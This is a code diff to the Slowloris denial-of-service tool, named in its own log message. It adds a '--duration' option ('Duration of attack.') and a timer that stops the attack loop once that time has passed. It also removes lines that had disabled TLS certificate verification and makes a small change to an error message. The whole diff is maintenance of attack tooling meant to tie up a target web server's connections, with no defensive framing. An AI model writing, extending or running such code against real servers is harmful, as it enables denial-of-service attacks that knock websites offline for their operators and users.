@@ -60,6 +60,12 @@ parser.add_argument(
     type=int,
     help="Time to sleep between each header sent.",
 )
+parser.add_argument(
+    "--duration",
+    dest="duration",
+    type=int,
+    help="Duration of attack.",
+)
 parser.set_defaults(verbose=False)
 parser.set_defaults(randuseragent=False)
 parser.set_defaults(useproxy=False)
@@ -71,7 +77,7 @@ if len(sys.argv) <= 1:
     sys.exit(1)
 
 if not args.host:
-    print("Host required!")
+    print("Host required! \n")
     parser.print_help()
     sys.exit(1)
 
@@ -159,8 +165,6 @@ def init_socket(ip):
 
     if args.https:
         ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
         s = ctx.wrap_socket(s, server_hostname=args.host)
 
     s.connect((ip, args.port))
@@ -191,6 +195,8 @@ def main():
             break
         list_of_sockets.append(s)
 
+    start = time.time()
+
     while True:
         try:
             logging.info(
@@ -217,6 +223,8 @@ def main():
 
         except (KeyboardInterrupt, SystemExit):
             logging.info("Stopping Slowloris")
+            break
+        if time.time() > start + args.duration: 
             break
 
 
